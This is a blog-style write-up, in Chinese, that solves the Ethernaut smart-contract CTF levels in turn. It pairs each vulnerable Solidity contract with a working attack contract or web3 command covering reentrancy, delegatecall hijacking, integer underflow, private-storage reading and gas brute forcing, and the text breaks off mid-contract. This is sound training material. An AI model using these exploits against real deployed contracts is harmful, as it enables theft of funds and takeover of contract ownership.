# 前言

看了一下ctfwiki上的，前面的知识点看起来还算不那么费劲，但是突然就是学个几天就开始上手比赛题属实太难了。。。所以先从简单的区块链靶场刷起，循序渐进，慢慢学习区块链的相关知识。

靶场链接：
[The Ethernaut](https://ethernaut.openzeppelin.com/)


# Hello Ethernaut

算是新手教程了，具体的前面的一些搭建，还有获取Rinkeby环境下的ETH的方式就不说了，靶场上也都说的比较清楚了。用help()可以得到一些常用的帮助，因为异步的问题，我们需要在函数前面加上`await`。
`contract`可以查看合约对象：
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210410131435180.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3JmcmRlcg==,size_16,color_FFFFFF,t_70)

`contract.abi`可以查看合约的function：
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210410131534687.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3JmcmRlcg==,size_16,color_FFFFFF,t_70)
`await contract.info()`可以Look into the levels's info method。
然后这一关就一步一步来就可以了，其实看了abi也就知道有哪些方法了：
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210410131837842.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3JmcmRlcg==,size_16,color_FFFFFF,t_70)
然后点submit即可。

# Fallback

看一下代码：

```javascript
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Fallback {

  using SafeMath for uint256;
  mapping(address => uint) public contributions;
  address payable public owner;

  constructor() public {
    owner = msg.sender;
    contributions[msg.sender] = 1000 * (1 ether);
  }

  modifier onlyOwner {
        require(
            msg.sender == owner,
            "caller is not the owner"
        );
        _;
    }

  function contribute() public payable {
    require(msg.value < 0.001 ether);   //发送少于0.001 ether
    contributions[msg.sender] += msg.value;
    if(contributions[msg.sender] > contributions[owner]) {   //基本不可能
      owner = msg.sender; 
    }
  }

  function getContribution() public view returns (uint) {
    return contributions[msg.sender];  //返回当前的contributions
  }

  function withdraw() public onlyOwner {
    owner.transfer(address(this).balance);
  }

  fallback() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
}

```

题目要求：

  1. you claim ownership of the contract
  2. you reduce its balance to 0

想成为owner这里可以做到：

```javascript
  fallback() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
```

但是需要`contributions[msg.sender] > 0`，还需要先在这里给一次钱：

```javascript
  function contribute() public payable {
    require(msg.value < 0.001 ether);   //发送少于0.001 ether
    contributions[msg.sender] += msg.value;
    if(contributions[msg.sender] > contributions[owner]) {   //基本不可能
      owner = msg.sender; 
    }
  }
```

但是怎么就是调用函数的时候给钱我就不会看，看了一下师傅们是这样：

```javascript
await contract.contribute({value: 1})
await contract.sendTransaction({value: 1})
// 上两步成为了 owner，下一步把合约的钱转走
await contract.withdraw()
```

调用函数给钱是`{value:1}`，直接给合约钱是`sendTransaction`。

# Fallout

相比前一题更简单了，要求：

> Claim ownership of the contract below to complete this level.

因此直接用这个构造函数（其实并不是，注意合约叫Fallout，但是这个函数叫Fal1out）就可以了：

```javascript
  /* constructor */
  function Fal1out() public payable {
    owner = msg.sender;
    allocations[owner] = msg.value;
  }
```

```javascript
await contract.Fal1out()
```

就算改名也不行，因为这题是在0.6.0，已经不支持和合约同名的构造函数了。

# Coin Flip

源码：

```javascript
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract CoinFlip {

  using SafeMath for uint256;
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() public {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}
```

要连续猜中10次，是随机数的问题了，隐约还记得区块链的随机数问题很大，查了一下，确实是区块链随机数的问题。
因为这里：`uint256 blockValue = uint256(blockhash(block.number.sub(1)));`，这个值是我们可以在本地算出来的，再加上`FACTOR`也是知道的，因此就可以直接攻击。

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210412233837181.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3JmcmRlcg==,size_16,color_FFFFFF,t_70)
还可以再学习一下区块链的一些知识，虽然只是稍微的了解：
[区块链入门教程](https://www.ruanyifeng.com/blog/2017/12/blockchain-tutorial.html)

写个攻击POC：

```javascript
pragma solidity ^0.6.0;



interface CoinFlip {
  function flip(bool _guess) external returns (bool) ;
}

contract Attack {
    CoinFlip constant private target = CoinFlip(0x41b21013f1470Fcd1e08988ef87ed88aD38037a1);
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    function feng() public {
        uint256 blockValue = uint256(blockhash(block.number-1));
        uint256 coinFlip = blockValue/FACTOR;
        bool side = coinFlip == 1 ? true : false;
        target.flip(side);
    }
}
```

只要能成功的发送10次feng()函数就可以了。因为在本地进行了预测。
但是其中可能会有失败的，主要还是因为：

```javascript
    if (lastHash == blockValue) {
      revert();
    }
```

即一个区块只能成功一次，而：
![在这里插入图片描述](https://img-blog.csdnimg.cn/2021041223482695.png)
因此并不是那种10分钟才能弄一次。


# Telephone

源码：

```javascript
pragma solidity ^0.6.0;

contract Telephone {

  address public owner;

  constructor() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}
```

Claim ownership of the contract below to complete this level.即可通关。
看了一下，主要是考察`tx.origin和msg.sender的区别`。
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210413215040535.png)
ctfwiki上解释的就比较清楚：
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210413215129811.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3JmcmRlcg==,size_16,color_FFFFFF,t_70)
因此我们只需要部署一个合约，在合约中调用这个题目中的changeOwner，这样题目中的`tx.origin`是我们自己，而`msg.sender`是我们部署的那个合约。

```javascript
pragma solidity ^0.6.0;

contract Telephone {

  address public owner;

  constructor() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}

contract Attack {
    Telephone constant private target = Telephone(0x6F28D4210D178F6B37bFBe8D1dD8b08402EaC12a);
    function hack() public {
        target.changeOwner(msg.sender);
    }
}
```

# Token

```javascript
pragma solidity ^0.6.0;

contract Token {

  mapping(address => uint) balances;
  uint public totalSupply;

  constructor(uint _initialSupply) public {
    balances[msg.sender] = totalSupply = _initialSupply;
  }

  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }

  function balanceOf(address _owner) public view returns (uint balance) {
    return balances[_owner];
  }
}
```

挺简单的了，关注这里：`require(balances[msg.sender] - _value >= 0);`
因为`balances[msg.sender]`和`value`都是uint，因此他们相减的结果一定仍然是uint(可能会存在下溢出)，所以一定大于等于0
然后下面出现下溢出：`balances[_to] += _value;`，使得余额变得很多。
直接打就行了`await contract.transfer("0xc6Ef69fBCEFc582E248b32fDB48f9BC685F6b1b1",21)`
因此初始余额是20，所以减21。

# Delegation

```javascript
pragma solidity ^0.6.0;

contract Delegate {

  address public owner;

  constructor(address _owner) public {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
}

contract Delegation {

  address public owner;
  Delegate delegate;

  constructor(address _delegateAddress) public {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  fallback() external {
    (bool result, bytes memory data) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
}
```

大致审一下，考察的应该是`delegatecall`的问题。

 - call: 最常用的调用方式，调用后内置变量 msg 的值会修改为调用者，执行环境为被调用者的运行环境(合约的 storage)。
 - delegatecall: 调用后内置变量 msg 的值不会修改为调用者，但执行环境为调用者的运行环境。
 - callcode: 调用后内置变量 msg 的值会修改为调用者，但执行环境为调用者的运行环境。

因为执行环境会变成调用者的环境，这个调用者即是`Delegation`合约，因此虽然调用的是`Delegate`合约里的pwn函数，但是修改的并不是`Delegate`合约里的owner，而是`Delegation`里的owner。
知道了原理就相当于直接让delegatecall调用pwn函数就可以了，关键是msg.data怎么构造，我不知道用solidity在remix上应该怎么弄，也没查到。
WP是用的web3.js：

```javascript
await contract.sendTransaction({data:0xdd365b8b});
```

至于这个函数前面的值，在本地算一下就可以了：

```javascript
pragma solidity ^0.4.0;

contract B {
    bytes4 public result;
    function test() public  {
        result = bytes4(keccak256("pwn()"));
    }
}
```

太菜了主要还不太懂web3.js，看来剩下的题目要暂时咕几天，先去学习一下web3.js。

**后来**：
发现了就是Remix上的这个功能：
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210413231513364.png)
把题目的代码复制上去，然后点At Address，就可以在Remix进行交互：
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210413231921546.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3JmcmRlcg==,size_16,color_FFFFFF,t_70)


但是这似乎还是没区别。注意下面的`Low level interactions`，之前一直都没用过。
参考文章：[Low level interactions on Remix IDE](https://medium.com/remix-ide/low-level-interactions-on-remix-ide-5f79b05ac86)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210413231705916.png)
因此这里就相当于直接可以调用那个fallback函数，而且下面的框里面输入的就是calldata：
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210413231806512.png)
因此直接搞即可。但是后来发现失败了：
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210413231826608.png)
还有个坑，就是gas限制的问题：
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210413231943149.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3JmcmRlcg==,size_16,color_FFFFFF,t_70)
29858太小了，虽然说是交易成功，但是要仔细看交易的Details才能知道是因为gas不够而失败了。日！突然发现之前好像就是因为这个坑卡了几个小时还没解决，之前的那些问题似乎都是因为gas这个限制太小了，所以我们给它稍微加大一点，就可以成功了。

# Force

给了一个空的合约，要求：
The goal of this level is to make the balance of the contract greater than zero.

直接利用selfdestruct即可：
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210413234428960.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3JmcmRlcg==,size_16,color_FFFFFF,t_70)

因此强制转账：

```javascript
pragma solidity ^0.6.0;

contract Feng {
    function attack(address _addr) payable public {
        selfdestruct(payable(_addr));
    }
}
```

记得调用attack的时候给合约转1 wei。

# Vault

```javascript
pragma solidity ^0.6.0;

contract Vault {
  bool public locked;
  bytes32 private password;

  constructor(bytes32 _password) public {
    locked = true;
    password = _password;
  }

  function unlock(bytes32 _password) public {
    if (password == _password) {
      locked = false;
    }
  }
}

```

考察的就是Solidity中变量的可见性问题了：
[合约变量的「皇帝新衣」| 外部读取状态变量——漏洞分析连载之九期](https://blog.csdn.net/Blockchain_lemon/article/details/82836002)
虽然password设置成了private无法查看，但：

> 因为这个私有仅限于合约层面的私有，合约之外依然可以读取。

> 合约使用外界未知的私有变量。虽然变量是私有的，无法通过另一合约访问，但是变量储存进 storage 之后仍然是公开的。我们可以使用区块链浏览器（如 etherscan）观察 storage 变动情况，或者计算变量储存的位置并使用 Web3 的 api 获得私有变量值

说白了就是只要能计算出那个私有变量在storage中的位置，就直接调用Web3的api来获得那个变量值。
我不想用题目的环境直接打，尝试自己学一下web3.js，参考链接：
[web3.js 教程](https://www.qikegu.com/docs/5124)
利用infura来访问节点，记得改一下ENDPOINTS。
看一下位置，bool占用slot0，因此password在slot1，直接获得即可：

```javascript
const Web3 = require('web3');
const rpcURL = "https://rinkeby.infura.io/v3/2ab0c9f096474b2a8b7b60a25ded6c21";
const web3 = new Web3(rpcURL);


web3.eth.getStorageAt("0x40c4BfC852EdE4D3D05B0ed0886344864f4cB149", "1", function(x,y){console.info(y);})
```

得到0x412076657279207374726f6e67207365637265742070617373776f7264203a29，解码得到`A very strong secret password :)`
传过去即可解锁：
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210414101011450.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3JmcmRlcg==,size_16,color_FFFFFF,t_70)

> It's important to remember that marking a variable as private only prevents other contracts from accessing it. State variables marked as private and local variables are still publicly accessible.
> To ensure that data is private, it needs to be encrypted before being put onto the blockchain. In this scenario, the decryption key should never be sent on-chain, as it will then be visible to anyone who looks for it. zk-SNARKs provide a way to determine whether someone possesses a secret parameter, without ever having to reveal the parameter.

# King

看一下题目的要求：
When you submit the instance back to the level, the level is going to reclaim kingship. You will beat the level if you can avoid such a self proclamation.
意思是submit的时候环境会尝试取代你的king，如果题目没有成功的话你就赢了。
主要还是这里：

```javascript
king.transfer(msg.value);
```

考察了一下transfer：
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210414105736611.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3JmcmRlcg==,size_16,color_FFFFFF,t_70)
如果transfer执行失败会进行回退，而call和send函数则不是，而是返回一个false，因此这就是为什么需要检查call和send的返回值的原因。
因此直接写个合约，在里面fallback抛出异常即可。

```javascript
pragma solidity ^0.6.0;

contract Feng{
    address target = 0x20b5Ff3460aE2a6C7D8fdE858CD1C6e1311445D4;
    function attack() payable public {
        target.call{value : 1 ether}("");
    }
    fallback() external payable {
        require(false);
    }
}
```

# Re-entrancy

重入攻击，具体的知识点不提了，遇到好几次了。
过关的条件一开始很迷，重入攻击构造出来了，还利用了下溢出，但是不知道该怎么过关。
The goal of this level is for you to steal all the funds from the contract.
其实就是合约的余额初始是 1ether，然后我们给他donate，它的余额还会增加，利用重入攻击把合约的钱都拿出来就行了：

```javascript
pragma solidity ^0.6.0;

contract Feng {
    address target = 0x6f28304754abDd1c6511ed74d7E548fff87eFE9a;
    function hack() payable public {
        target.call{value:1 ether}(abi.encodeWithSignature("donate(address)",this));
        target.call(abi.encodeWithSignature("withdraw(uint256)",1 ether));
        
    }
    fallback() payable external {
        target.call(abi.encodeWithSignature("withdraw(uint256)",1 ether));
    }
}
```

`wait getBalance(contract.address)`可以查看合约的余额。

# Elevator

也很简单，让top为true即可。

```javascript
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
```

构造个Building合约，实现接口中的信息，然后让第一次调用`isLastFloor`返回false，第二次调用`isLastFloor`返回true即可：

```javascript
pragma solidity ^0.6.0;


contract Building {
    address public target = 0x802450E17Ad3e0D1484bb8817EF76505FFB7FcB1;
    bool public flag = false;
    function isLastFloor(uint) external returns (bool){
        if(flag == false){
            flag = true;
            return false;
        }
        return true;
    }
    function attack() public {
        target.call(abi.encodeWithSignature("goTo(uint256)",1));
    }
}
```

# Privacy

还是private的值不知道：

```javascript
  bool public locked = true;   //0
  uint256 public ID = block.timestamp;   //1
  uint8 private flattening = 10;      //2
  uint8 private denomination = 255;     //2
  uint16 private awkwardness = uint16(now);     //2
  bytes32[3] private data;       // 3 4 5
```

算出`data[2]`在slot 5，然后还是web3.js直接getStorageAt就行了：

```javascript
const Web3 = require('web3');
const rpcURL = "https://rinkeby.infura.io/v3/2ab0c9f096474b2a8b7b60a25ded6c21";
const web3 = new Web3(rpcURL);


const address = "0x6d94A5398Ea81aFb2C6961d1f45dfdC347b17996"

web3.eth.getStorageAt(address,"5",function(x,y){console.info(y);});
```

```javascript
pragma solidity ^0.6.0;


contract Feng {
    address public target = 0x6d94A5398Ea81aFb2C6961d1f45dfdC347b17996;
    bytes32 public data = 0x6d95528ed3daa151fd935b44136df24bce871b1f40ccaced0e5f4b6d32777209;
    bytes16 public key = bytes16(data);
    function attack() public {
        target.call(abi.encodeWithSignature("unlock(bytes16)",key));
    }
}
```


# Gatekeeper One

感觉很迷的一道题。

```javascript
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract GatekeeperOne {

  using SafeMath for uint256;
  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(gasleft().mod(8191) == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    //22220  43321   21101
    //5020   26221
    //0x 00 00 00 11 00 00 3F B8
    //0x 00 00 00 00 00 00 12 12
    //0x7D11f36fA2FD9B7A4069650Cd8A2873999263FB8
    //0x 00 00 3F B8 uint16
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(tx.origin), "GatekeeperOne: invalid gateThree part three");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}
```

三个modifier，第一个很好绕就不说了，第二个最后再说，先看第三个：

```javascript
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(tx.origin), "GatekeeperOne: invalid gateThree part three");
```

考察了solidity的类型转换，相当于`_gatekey`的最后4个字节拿出来和最后2个字节拿出来是相等的，因此最后是`00xx`即可，第二个的话，就相当于最后8字节和最后4字节不一样，前4个字节改一下就好了。
最后一个require就是最后2字节和tx.origin是一样的即可。
因此我这构造是这样：`0x0000001100003FB8`，最后2个字节和我地址的最后2字节一样,3FB8。这样就绕过了。

接下来就是第二个modifier，要求`gasleft().mod(8191) == 0`:
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210414170158306.png)
相当于call传过去的gas，到第二个modifier剩余的gas，相当于要找到从call那里到这个require所花费的gas。属实不太会。。
看了WP，师傅们是在本地调。换到Javascript VM，起2个合约：
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210414170709701.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3JmcmRlcg==,size_16,color_FFFFFF,t_70)

Feng合约调用一下attack()函数，然后debug一下：
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210414170643429.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210414170842890.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3JmcmRlcg==,size_16,color_FFFFFF,t_70)
还是太菜了，看不懂那些指令，看师傅们都是在DUP2那里停的，左下角有个remaining gas:
81874
81910+215-81874就是前面所花费的gas了。我这里是251，题目的环境也应该是0.6.0版本，不知道为什么师傅们都在0.4版本调，调出来是215，而且确实是对的。。。我也不想换版本了，就大范围的跑一下循环叭：

```javascript
pragma solidity ^0.6.0;
contract Feng {
    bytes8 public gatekey = 0x0000001100003FB8;
    address public target = 0xe9B1A344a91c338dA1873A7698cf3a30572EAb4e;
    function attack() public {
        for(uint i = 150;i <=300 ;i ++){
            target.call{gas:81910+i}(abi.encodeWithSignature("enter(bytes8)",gatekey));
        }
    }
}
```

也能跑成功，那些操作码等学会了再来看看。



# Gatekeeper Two

又学到了新东西。源码：

```javascript
pragma solidity ^0.6.0;

contract GatekeeperTwo {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    uint x;
    assembly { x := extcodesize(caller()) }
    require(x == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1);
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}
```

相对来说比较难的是gateTwo那里不知道该怎么绕。涉及到内联注释，学习文章：
[ethervm](https://ethervm.io/)
[Solidity 中编写内联汇编(assembly)的那些事[译]](https://learnblockchain.cn/article/675)

```javascript
assembly { x := extcodesize(caller()) }
caller():message caller address
extcodesize():length of the contract bytecode at addr, in bytes
```

extcodesize是用来检查地址是不是合约地址的：

> caller 为合约时，获取的大小为合约字节码大小，caller 为账户时，获取的大小为 0 。

因此正常这里如果绕过gateOne的`require(msg.sender != tx.origin);`的话，这里也就绕不过了，因此我以为是gateOne的那里需要改变一种姿势绕，但是查不到新姿势。。。
看了一下，WP：

> 经过研究发现，当合约在初始化，还未完全创建时，代码大小是可以为0的。因此，我们需要把攻击合约的调用操作写在 constructor 构造函数中。

因此只要把攻击代码写在`constructor`里面就可以了。
至于gateOne就很简单了：

```javascript
require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1);
```

`uint64(0)-1`存在一个下溢出，溢出后是`0xffffffffffffffff`，因此前面需要得到`0xffffffffffffffff`。前面`^`是相同为0，不同为1，因此必须和前面结果的每一位都不一样，那就按位取反即可：
`gateKey = bytes8(~(uint64(bytes8(keccak256(abi.encodePacked(this))))));`

POC：

```javascript
pragma solidity ^0.6.0;

contract Feng {
    bytes8 public gateKey;
    address public target = 0x376E65f6d59Ec9f5cD3e9F9B18F05A0BB34A0bab;
    constructor() public {
        gateKey = bytes8(~(uint64(bytes8(keccak256(abi.encodePacked(this))))));
        target.call(abi.encodeWithSignature("enter(bytes8)",gateKey));
        
    }
}
```

# Naught Coin

知识盲区，考察了ERC20。
源代码：

```javascript
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/token/ERC20/ERC20.sol';

 contract NaughtCoin is ERC20 {

  // string public constant name = 'NaughtCoin';
  // string public constant symbol = '0x0';
  // uint public constant decimals = 18;
  uint public timeLock = now + 10 * 365 days;
  uint256 public INITIAL_SUPPLY;
  address public player;

  constructor(address _player) 
  ERC20('NaughtCoin', '0x0')
  public {
    player = _player;
    INITIAL_SUPPLY = 1000000 * (10**uint256(decimals())); //decimals=18
    // _totalSupply = INITIAL_SUPPLY;
    // _balances[player] = INITIAL_SUPPLY;
    _mint(player, INITIAL_SUPPLY);
    emit Transfer(address(0), player, INITIAL_SUPPLY);
  } 
  
  function transfer(address _to, uint256 _value) override public lockTokens returns(bool) {
    super.transfer(_to, _value);
  }

  // Prevent the initial owner from transferring tokens until the timelock has passed
  modifier lockTokens() {
    if (msg.sender == player) {
      require(now > timeLock);
      _;
    } else {
     _;
    }
  } 
} 
```

逻辑也不算难，说白了就是player是你自己，你的账号余额就是`INITIAL_SUPPLY = 1000000 * (10**uint256(decimals()));`，只要把这些钱转出去就赢了，但是transfer函数那里有`lockTokens`，必须`now > timeLock`才行，即过10年才能转账。

这题考察的是ERC20的2个转账函数，自己还是太菜了不会ERC20，做完这题后再去把ERC20看一遍。

ERC20有2个转账函数transfer和transferFrom：
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210415164538463.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3JmcmRlcg==,size_16,color_FFFFFF,t_70)
题目里只override了transfer函数，并没有重写这个transferFrom函数，因此可以考虑利用transferFrom。

想了一下，发现和之前学solidity时遇到的那个ERC721里的转账有些类似：
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210415165646392.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3JmcmRlcg==,size_16,color_FFFFFF,t_70)
至于为什么类似，分析一下这个ERC20的代码就知道了：

```javascript
import '@openzeppelin/contracts/token/ERC20/ERC20.sol';
```

题目的描述中，help给出了代码链接：
[ERC20](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol#L6)
看一下：
![在这里插入图片描述](https://img-blog.csdnimg.cn/2021041516593465.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3JmcmRlcg==,size_16,color_FFFFFF,t_70)

`_transfer`就不看了，调用transfer函数同样也会进入`_transfer`，里面具体的进行了转账。
注意接下来的2行代码：

```javascript
uint256 currentAllowance = _allowances[sender][_msgSender()];
require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
```

这个东西一开始我还不知道是啥，觉得很迷，继续看下面的`_approve`：
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210415170232864.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3JmcmRlcg==,size_16,color_FFFFFF,t_70)
就相当于tranfer直接是拥有者调用，将他的代币转给别人，而transfer是由被转账的人调用，这个`_allowances[owner][spender]`就是许可的金额，意思是owner这个账号允许转给spender这个账号的代币的数量，如果这个不空的话，spender就可以调用`transferFrom`函数从owner那里获得转账。
因此上面的那两行代码，是检查被授权的转账余额是不是大于等于要求的转账余额。
因此我们需要先授权一下转账的余额：
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210415170624813.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3JmcmRlcg==,size_16,color_FFFFFF,t_70)
正好owner是我们自己，也就是player，因此可以授权。这里最简单就是授权给自己，因为transferFrom函数的这里：

```javascript
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
```

并不是取`_allowances[sender][recipient]`，因此在这里就相当于取得是自己给自己授权得余额，直接打就可以了：

```javascript
await contract.approve(player,toWei("1000000"))
await contract.transferFrom(player,contract.address,toWei("1000000"))
```

还是对ERC20不熟悉呀，去好好学一波。


# Preservation

这题没能做出来，但是知识点我都知道，还是我太菜了，有空要把call的那些一定好好总结一下。

 - call: 最常用的调用方式，调用后内置变量 msg 的值会修改为调用者，执行环境为被调用者的运行环境(合约的 storage)。
 - delegatecall: 调用后内置变量 msg 的值不会修改为调用者，但执行环境为调用者的运行环境。
 - callcode: 调用后内置变量 msg 的值会修改为调用者，但执行环境为调用者的运行环境。

源码就不分析了比较简单，主要的就是这里：

```javascript
    function setFirstTime(uint _timeStamp) public {
      timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
    }
```

参考上面的delegatecall的讲解，执行环境为调用者的环境，也就是当前Preservation合约的环境。
调用了`LibraryContract`的`setTime()`方法。修改了storedTime：

```javascript
    // stores a timestamp 
    uint storedTime;  

    function setTime(uint _time) public {
      storedTime = _time;
    }
```

storedTime是位于slot0的，因此实际上是修改Preservation合约的storage中slot0，也就是`address public timeZone1Library;`，因此这个`address public timeZone1Library;`是我们可控的，既然这个可控了，可以自己写一个恶意合约，让这个量是我们的恶意合约的地址，然后这个合约中的setTime函数修改一下slot2的值，也就是owner即可。
写个POC：

```javascript
//SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.0;

 contract LibraryContract {
     address public timeZone1Library;
     address public timeZone2Library;
     address public owner;      
     function setTime(uint _time) public {
         owner = 0x7D11f36fA2FD9B7A4069650Cd8A2873999263FB8;
     }
 }
 
 contract Feng {
     LibraryContract lib = new LibraryContract();
     address public target = 0xf423151f829CD798877bD52b2752387D22CF5416;
     function attack() public {
         target.call(abi.encodeWithSignature("setFirstTime(uint256)",lib));
         target.call(abi.encodeWithSignature("setFirstTime(uint256)",uint(1)));
     }
 }
```

# Recovery

挺迷的一题。。。主要是因为英文介绍我死活看不懂。。。：

> A contract creator has built a very simple token factory contract. Anyone can create new tokens with ease. After deploying the first token contract, the creator sent 0.5 ether to obtain more tokens. They have since lost the contract address.
> This level will be completed if you can recover (or remove) the 0.5 ether from the lost contract address.

大致理解就是有一个简单的代币工厂合约，任何人都可以很轻易的创造新的代币。在创建的第一个代币合约后，创建者发送了0.5ether来获得更多的代币。但是他们弄丢了合约的地址。
如果你可以恢复或者拿走着0.5ether从这个丢失的合约地址，你就可以通过。

虽然我对于这个题目的意思有点迷，但我还是会看以太坊浏览器。。。
看一下当前的合约，去以太坊里查一下：
![在这里插入图片描述](https://img-blog.csdnimg.cn/202104160013086.png)
这个操作让我挺迷的。。。：
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210416001328144.png)
d99开头的是我题目的合约地址，先转1到0x8d，然后再转0.5 ether给0xddd。。
感觉好像这个8d07是个中转的。。。反正迷的很，不过反正那0.5 ether是在0xddda...那里了，直接写个POC打即可：

```javascript
//SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.0;


interface SimpleToken {    
  function destroy(address payable _to) external ;
}

contract Feng {
